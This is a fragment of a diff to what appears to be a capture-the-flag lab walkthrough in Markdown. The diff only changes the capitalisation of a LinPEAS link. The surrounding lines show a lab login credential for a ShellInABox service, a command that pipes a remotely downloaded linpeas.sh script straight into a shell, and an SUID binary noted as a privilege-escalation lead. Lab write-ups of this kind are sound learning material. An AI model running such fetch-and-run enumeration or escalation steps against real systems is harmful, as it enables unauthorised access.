@@ -164,12 +164,12 @@ P4$$w0rd
 
 **Login to ShellInABox with** _n30:P4\$\$w0rd_ **@** https://192.168.5.106:12320/
 
-**Run [[linpeas]]**
+**Run [[LinPEAS]]**
 ```bash
 $ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-**Of note in [[Linpeas]] output - morpheus SUID binary in** _/usr/bin_:
+**Of note in [[LinPEAS]] output - morpheus SUID binary in** _/usr/bin_:
 
 ```bash
 ╔════════════════════════════════════╗
